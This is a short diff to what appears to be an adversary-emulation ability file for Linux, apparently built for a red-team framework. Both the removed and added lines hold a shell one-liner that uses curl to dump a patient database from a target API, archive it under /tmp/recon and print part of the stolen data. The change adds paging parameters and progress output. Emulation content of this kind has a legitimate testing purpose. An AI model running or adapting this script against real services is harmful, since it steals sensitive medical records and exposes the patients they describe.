@@ -9,4 +9,4 @@
     linux:
       sh:
         command: |
-          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; CODE=$(curl -s -L -w "%{http_code}" -o "$RAW" --connect-timeout 10 "$API_BASE/patients/"); if [ "$CODE" != "200" ]; then echo "Error HTTP $CODE" >&2; exit 1; fi; tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "Dump successful: $OUTDIR/db_dump_$TS.tar.gz"
+          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; echo "[*] Dumping patient database from $API_BASE..."; CODE=$(curl -s -L -w "%{http_code}" -o "$RAW" --connect-timeout 10 "$API_BASE/patients?skip=0&limit=1000"); if [ "$CODE" != "200" ]; then echo "[-] Error HTTP $CODE" >&2; exit 1; fi; SIZE=$(wc -c < "$RAW"); echo "[+] Downloaded $SIZE bytes of patient data"; tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "[+] Dump archived: $OUTDIR/db_dump_$TS.tar.gz"; head -c 500 "$RAW"
